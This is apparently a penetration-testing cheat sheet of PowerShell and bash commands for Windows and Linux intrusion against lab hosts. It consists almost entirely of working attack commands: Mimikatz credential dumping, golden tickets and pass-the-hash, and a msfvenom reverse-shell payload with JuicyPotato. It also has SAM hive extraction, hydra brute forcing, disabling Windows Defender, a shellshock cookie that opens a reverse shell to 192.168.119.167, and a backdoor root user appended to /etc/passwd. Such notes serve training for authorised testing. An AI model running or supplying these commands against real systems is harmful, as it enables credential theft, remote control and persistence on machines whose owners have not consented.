+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Copy-Item</span> <span class="hljs-string">&quot;C:\files\mimikatz.exe&quot;</span> <span class="hljs-literal">-Destination</span> <span class="hljs-string">&quot;C:\Users\Public\Documents\&quot;</span> <span class="hljs-literal">-ToSession</span> <span class="hljs-variable">$session</span> <span class="hljs-literal">-Recurse</span><br></code></pre></div></td></tr></table></figure>
+<p>Remote to local computer</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Copy-Item</span> <span class="hljs-string">&quot;C:\Users\ik.ps1&quot;</span> <span class="hljs-literal">-Destination</span> <span class="hljs-string">&quot;C:\Documents\&quot;</span> <span class="hljs-literal">-FromSession</span> <span class="hljs-variable">$session</span> <span class="hljs-literal">-Recurse</span><br></code></pre></div></td></tr></table></figure>
+<p>like find . / ls -al</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Path</span> . <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Force</span><br></code></pre></div></td></tr></table></figure>
+<p>PSCredential plain-text passwd</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;MySecretPassword&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$credential</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-variable">$password</span>)<br><br><span class="hljs-comment"># Get plain-text passwd</span><br><span class="hljs-variable">$credential</span>.GetNetworkCredential()<br><span class="hljs-variable">$credential</span>.GetNetworkCredential().Password<br></code></pre></div></td></tr></table></figure>
+<p>New-PSDrive Remote Computer</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">smbserver.py <span class="hljs-literal">-smb2support</span> <span class="hljs-literal">-username</span> admin <span class="hljs-literal">-password</span> <span class="hljs-number">123456</span> shareme <span class="hljs-variable">$</span>(<span class="hljs-built_in">pwd</span>)<br><span class="hljs-comment"># null passwd</span><br><span class="hljs-built_in">New-PSDrive</span> <span class="hljs-literal">-Name</span> evil <span class="hljs-literal">-PSProvider</span> FileSystem <span class="hljs-literal">-Root</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">119.167</span>\shareme<br><br><span class="hljs-comment"># Use Passwd</span><br><span class="hljs-variable">$sp</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-PSDrive</span> <span class="hljs-literal">-Name</span> evil <span class="hljs-literal">-PSProvider</span> FileSystem <span class="hljs-literal">-Root</span> \\<span class="hljs-number">192</span>.IP\shareme                                           <br><span class="hljs-built_in">New-PSDrive</span> <span class="hljs-literal">-Name</span> evil <span class="hljs-literal">-PSProvider</span> FileSystem <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-Root</span> \\<span class="hljs-number">192</span>.IP\shareme<br><br><span class="hljs-built_in">Remove-PSDrive</span> <span class="hljs-literal">-Name</span> evil<br><br><span class="hljs-built_in">Get-PSDrive</span><br></code></pre></div></td></tr></table></figure>
+<p>Port Scan</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$ports</span> = <span class="hljs-string">&quot;21 22 25 53 80 111 139 443 445 3306 3389 8000 8080&quot;</span><br><span class="hljs-variable">$ip</span>    = <span class="hljs-string">&quot;192.168.0.100&quot;</span><br><span class="hljs-variable">$ports</span>.split(<span class="hljs-string">&quot; &quot;</span>) | % &#123;<span class="hljs-built_in">echo</span> ((<span class="hljs-built_in">new-object</span> Net.Sockets.TcpClient).Connect(<span class="hljs-variable">$ip</span>,<span class="hljs-variable">$_</span>)) <span class="hljs-string">&quot;Port <span class="hljs-variable">$_</span> is open on <span class="hljs-variable">$ip</span>&quot;</span>&#125; <span class="hljs-number">2</span>&gt;<span class="hljs-variable">$null</span><br></code></pre></div></td></tr></table></figure>
+<p>Find Keyword</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> C:\www <span class="hljs-literal">-Include</span> *.txt,*.xml,*.config,*.conf,*.cfg,*.ini <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue | <span class="hljs-built_in">Select-String</span> <span class="hljs-literal">-Pattern</span> <span class="hljs-string">&quot;password&quot;</span><br></code></pre></div></td></tr></table></figure>
+<p>Disable/Enable Windows Defender</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># Disable</span><br><span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span><br><br><span class="hljs-comment"># Enable</span><br><span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$false</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><ul>
+<li>Port Scan<ul>
+<li>Nmap</li>
+<li>Masscan</li>
+</ul>
+</li>
+<li>Mimikatz</li>
+<li>PsExec</li>
+<li>JuicyPotato</li>
+<li>SMB<ul>
+<li>psexec.py</li>
+<li>wmiexec.py</li>
+<li>smbclient</li>
+</ul>
+</li>
+<li>Password<ul>
+<li>hashcat</li>
+<li>cewl</li>
+<li>hydra</li>
+</ul>
+</li>
+<li>MSF<ul>
+<li>msfconsole</li>
+</ul>
+</li>
+<li>Hash</li>
+<li>Web<ul>
+<li>Scan</li>
+<li>Dir Enum</li>
+<li>Password Attack</li>
+<li>SQL Injection</li>
+</ul>
+</li>
+<li>Ldap</li>
+</ul>
+<br/>
+
+<h3 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a>Port Scan</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap -sU -sV --top-ports 100 -oA nmap/top_100_udp 10.11.1.44<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">proxychains4 nmap -Pn -sT -sC -sV -oA nmap/full 10.1.xx.x<br></code></pre></div></td></tr></table></figure>
+<h4 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">masscan -p1-65535,U:1-65535 10.11.1.111 --rate=1000 -e tun0 &gt; ports<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># system priv</span><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::sam&quot;</span> <span class="hljs-keyword">exit</span><br><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::secrets&quot;</span> <span class="hljs-keyword">exit</span><br><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::list /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-keyword">exit</span><br><br><span class="hljs-comment"># history0 is a last change passwd</span><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::setntml /user:USER /ntml:NTML&quot;</span> <span class="hljs-keyword">exit</span><br><br><span class="hljs-comment"># MsCacheV2</span><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::cache&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment"># log</span><br>mimikatz.exe <span class="hljs-string">&quot;log&quot;</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::dcsync /user:Krbtgt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;sekurlsa::msv&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment"># cmdkey</span><br>mimikatz.exe <span class="hljs-string">&quot;vault::cred&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment"># pth</span><br>mimikatz.exe <span class="hljs-string">&quot;sekurlsa::pth /user:alice /domain:SVCORP.COM /ntlm:xxx04xx6B8F7B2A3B6C47780xxxxxxxx /run:C:\Windows\System32\spool\drivers\color\re9.exe&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /user:evil /domain:corp.com /sid:S-1-5-21-x-x-x /rc4:7xxx5 /ptt&quot;</span><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /user:evil /domain:corp.com /sid:S-1-5-21-x-x-x /target:xxx.corp.com /service:HOST /krbtgt:7xxx5 /ptt&quot;</span><br>mimikatz.exe <span class="hljs-string">&quot;misc::cmd&quot;</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p>local cmd</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">PsExec64<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">i</span> -u awsl -<span class="hljs-selector-tag">p</span> callme1234 C:\Windows\System32\cmd.exe<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="JuicyPotato"><a href="#JuicyPotato" class="headerlink" title="JuicyPotato"></a>JuicyPotato</h3><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># JuicyPotato reverse shell</span><br><span class="hljs-comment"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=4445 -f exe -o re.exe</span><br><span class="hljs-comment"># CLSID : https://ohpe.it/juicy-potato/CLSID/</span><br>cmd /c <span class="hljs-string">&#x27;JuicyPotato.exe -l 1234 -p re.exe -t * -c &#123;8BC3F05E-D86B-11D0-A075-00C04FB68820&#125;&#x27;</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>psexec</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">psexec.py -hashes :700a8c186d267b607559db7xxxxxxxxxx Administrator@10.11.1.13<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wmiexec.py -hashes :700a8c186d267b607559db7xxxxxxxxxx Administrator@10.11.1.13<br></code></pre></div></td></tr></table></figure>
+<p>crackmapexec</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">crackmapexec smb 10.11.x.x -u Administrator -H xxxxxxxxxxHash<br><br>crackmapexec smb 10.11.x.x -u USER.list -p PASSWD.list<br></code></pre></div></td></tr></table></figure>
+<p>smbclient</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">smbclient ////10.11.1.13//share<br>smbclient //10.11.1.13/share<br>smbclient -L 10.11.1.231<br>smbclient //share/home -I 192.10.2.11 -N<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="Password"><a href="#Password" class="headerlink" title="Password"></a>Password</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hashcat --force --stdout -a 6 year.pass ?d?d?d?d?s &gt; result.pass<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">proxychains cewl -m 3 -a --with-numbers http://10.11.1.x -w cewl.txt<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hydra -I -l root@localhost -P cewl.txt 10.11.1.xx http-post-form <span class="hljs-string">&quot;/otrs/index.pl:Action=Login&amp;RequestedURL=&amp;Lang=en&amp;TimeOffset=240&amp;User=^USER^&amp;Password=^PASS^:F=Login failed&quot;</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><h4 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">portfwd add -l 8888 -p 445 -r 10.11.1.14<br>portfwd add -l 445 -p 445 -r 10.11.1.14<br><br><span class="hljs-comment"># msf portfwd</span><br><span class="hljs-comment"># [*] Local TCP relay created: :8888 &lt;-&gt; 10.11.1.14:445</span><br><span class="hljs-comment"># localhost:8888 --&gt; 10.11.1.14:445</span><br></code></pre></div></td></tr></table></figure>
+<p>Suggester</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use post/multi/recon/local_exploit_suggester<br></code></pre></div></td></tr></table></figure>
+<p>UAC</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use exploit/windows/<span class="hljs-built_in">local</span>/bypassuac_sdclt<br>getsystem<br></code></pre></div></td></tr></table></figure>
+<p>Kiwi</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 注意引号</span><br>kiwi_cmd <span class="hljs-string">&#x27;&quot;sekurlsa::tickets /export&quot;&#x27;</span><br></code></pre></div></td></tr></table></figure>
+<p>Search</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">search handler <span class="hljs-built_in">type</span>:exploit<br>search cve:2007-2446<br></code></pre></div></td></tr></table></figure>
+<p>Upload File</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">upload /tmp/callme.vbs C:\callme.vbs<br></code></pre></div></td></tr></table></figure>
+<p>Route</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">meterpreter &gt; run get_local_subnets<br><span class="hljs-comment"># Local subnet: 10.12.1.0/255.255.255.0</span><br><br>meterpreter &gt; run autoroute -s 10.12.1.0/255.255.255.0<br><br>meterpreter &gt; run autoroute -p<br></code></pre></div></td></tr></table></figure>
+<h4 id="Modules"><a href="#Modules" class="headerlink" title="Modules"></a>Modules</h4><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/.msf4/m</span>odules<br></code></pre></div></td></tr></table></figure>
+<p>searchsploit 45269</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">PATH<br>-----------------------<br>windows/local/45269.rb<br></code></pre></div></td></tr></table></figure>
+<p>copy to modules</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">mkdir -p <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/.msf4/m</span>odules<span class="hljs-regexp">/windows/</span>local<br><br>searchsploit -m windows<span class="hljs-regexp">/local/</span><span class="hljs-number">45269</span>.rb<br></code></pre></div></td></tr></table></figure>
+
+<br/>
+
+<h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>Extracting hash from SAM(local)</p>
+<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">reg save hklm\sam C:\SAM<br>reg save hklm\system C:\SYSTEM<br>reg save hklm\security C:\SECURITY<br><br>impacket<span class="hljs-literal">-secretsdump</span> <span class="hljs-literal">-system</span> system <span class="hljs-literal">-sam</span> sam <span class="hljs-literal">-security</span> security LOCAL<br></code></pre></div></td></tr></table></figure>
+<p>List history passwd</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># List history passwd</span><br>secretsdump.py -just-dc -<span class="hljs-built_in">history</span> -hashes LM:NTLM Administrator@10.11.x.x<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nikto -host http://10.11.1.39 -o nikto.json -Format json -Display P<br>nikto -host http://10.11.1.39 -Plugins robots<br><br><span class="hljs-comment"># dir_traversal,clientaccesspolicy,msgs,shellshock,robots,</span><br><span class="hljs-comment"># content_search,httpoptions,put_del_test,sitefiles,strutshock</span><br></code></pre></div></td></tr></table></figure>
+<h4 id="Dir-Enum"><a href="#Dir-Enum" class="headerlink" title="Dir Enum"></a>Dir Enum</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ffuf -c -t 30 -<span class="hljs-built_in">fc</span> 403 -w wordlists:DIR -w extensions:EX -u https://127.0.0.1/DIR.EX -o out<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Wordlists -&gt; /uar/share/seclists/fuzz/*</span><br>wfuzz -c -u http://10.10.10.79/api/get -w /path/to/wordlists -d <span class="hljs-string">&#x27;&#123;&quot;name&quot;: &quot;FUZZ&quot;&#125;&#x27;</span><br><br><span class="hljs-comment"># Proxy -&gt; burp</span><br>wfuzz -c -u http://10.10.10.79/api/get -w /path/to/wordlists -d <span class="hljs-string">&#x27;&#123;&quot;name&quot;: &quot;FUZZ&quot;&#125;&#x27;</span> -p 127.0.0.1:8080:HTTP<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">feroxbuster --depth 2 -u http://10.11.1.xx/php/ -x php,txt,conf,cgi -t 50<br></code></pre></div></td></tr></table></figure>
+<h4 id="Password-Attack"><a href="#Password-Attack" class="headerlink" title="Password Attack"></a>Password Attack</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hydra -I -l root@localhost -P cewl.txt 10.11.1.xx http-post-form <span class="hljs-string">&quot;/otrs/index.pl:Action=Login&amp;RequestedURL=&amp;Lang=en&amp;TimeOffset=240&amp;User=^USER^&amp;Password=^PASS^:F=Login failed&quot;</span><br></code></pre></div></td></tr></table></figure>
+<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap -u http://10.11.1.x/login-off.asp --data=<span class="hljs-string">&#x27;txtLoginID=admin&amp;txtPassword=admin&amp;cmdSubmit=Login&#x27;</span> --skip=<span class="hljs-string">&#x27;cmdSubmit&#x27;</span> --dbms=<span class="hljs-string">&#x27;Microsoft SQL Server&#x27;</span> --random-agent<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="Ldap"><a href="#Ldap" class="headerlink" title="Ldap"></a>Ldap</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ldapsearch -LLL -x -H ldap://sv-dc01.svcorp.com -b <span class="hljs-string">&#x27;&#x27;</span> -s base <span class="hljs-string">&#x27;(objectclass=*)&#x27;</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><ul>
+<li>pseudo-terminal</li>
+<li>searchsploit</li>
+<li>shellshock attack</li>
+<li><code>/etc/passwd</code> is writable</li>
+<li>powershell run .ps1 Script</li>
+<li>NFS easy exploit</li>
+<li>if missing ticket</li>
+<li>Kerberoasting</li>
+<li>Crack MsCacheV2(DCC2)</li>
+<li>Unquoted Search Path</li>
+<li>group in docker</li>
+</ul>
+<br/>
+
+<p>pseudo-terminal</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># start up</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="hljs-built_in">export</span> SHELL=/bin/bash <br><span class="hljs-built_in">alias</span> ls=<span class="hljs-string">&#x27;ls --color=auto&#x27;</span> <br><span class="hljs-built_in">alias</span> ll=<span class="hljs-string">&#x27;ls -alh --color=auto&#x27;</span><br><span class="hljs-built_in">alias</span> grep=<span class="hljs-string">&#x27;grep --color=auto&#x27;</span><br><span class="hljs-built_in">export</span> TERM=xterm-256color<br></code></pre></div></td></tr></table></figure>
+<p>searchsploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">searchsploit --id MS17-017<br>searchsploit -m xxx<br>searchsploit --nmap allport.xml<br></code></pre></div></td></tr></table></figure>
+<p>shellshock attack</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Cookie:  () &#123; :;&#125;; /bin/bash -c <span class="hljs-string">&#x27;whoami; id; ifconfig&#x27;</span><br>Cookie:  () &#123; :;&#125;; /bin/bash -c <span class="hljs-string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.119.167/4444 &lt;&amp;1&#x27;</span><br></code></pre></div></td></tr></table></figure>
+<p><code>/etc/passwd</code> is writable</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">openssl passwd callme<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;evil:NIk9BGd8Qt8dI:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd<br><br>su evil<br></code></pre></div></td></tr></table></figure>
+<p>powershell 运行 .ps1 脚本</p>
